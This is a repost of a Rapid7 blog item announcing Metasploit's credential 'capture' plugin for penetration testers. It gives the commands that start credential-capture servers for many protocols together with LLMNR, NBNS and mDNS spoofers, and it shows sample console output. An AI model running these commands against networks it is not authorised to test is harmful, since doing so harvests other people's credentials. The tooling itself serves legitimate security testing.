Capturing credentials is a critical and early phase in the playbook of many offensive security testers. Metasploit has facilitated this for years with protocol-specific modules all under the auxiliary/server/capture. Users can start and configure each of these modules individually, but now the capture plugin can streamline the process. The capture plugin can easily start 13 different services (17 including SSL enabled versions) on the same listening IP address including remote interfaces via Meterpreter. A configuration file can be used to select individual services to start and once finished, all services can easily be stopped using a single command.

To use the plugin, it must first be loaded. That will provide the captureg command (for Capture-Global) which then offers start and stop subcommands. In the following example, the plugin is loaded, and then all default services are started on the 192.168.159.128 interface.

```
msf6 > load capture
[*] Successfully loaded plugin: Credential Capture
msf6 > captureg start --ip 192.168.159.128
Logging results to /home/smcintyre/.msf4/logs/captures/capture_local_20220325104416_589275.txt
Hash results stored in /home/smcintyre/.msf4/loot/captures/capture_local_20220325104416_612808
[+] Authentication Capture: DRDA (DB2, Informix, Derby) started
[+] Authentication Capture: FTP started
[+] HTTP Client MS Credential Catcher started
[+] HTTP Client MS Credential Catcher started
[+] Authentication Capture: IMAP started
[+] Authentication Capture: MSSQL started
[+] Authentication Capture: MySQL started
[+] Authentication Capture: POP3 started
[+] Authentication Capture: PostgreSQL started
[+] Printjob Capture Service started
[+] Authentication Capture: SIP started
[+] Authentication Capture: SMB started
[+] Authentication Capture: SMTP started
[+] Authentication Capture: Telnet started
[+] Authentication Capture: VNC started
[+] Authentication Capture: FTP started
[+] Authentication Capture: IMAP started
[+] Authentication Capture: POP3 started
[+] Authentication Capture: SMTP started
[+] NetBIOS Name Service Spoofer started
[+] LLMNR Spoofer started
[+] mDNS Spoofer started
[+] Started capture jobs
msf6 >
```

This content was originally posted on the [Rapid7 Blog](https://www.rapid7.com/blog/post/2022/03/25/metasploit-weekly-wrap-up-154/).
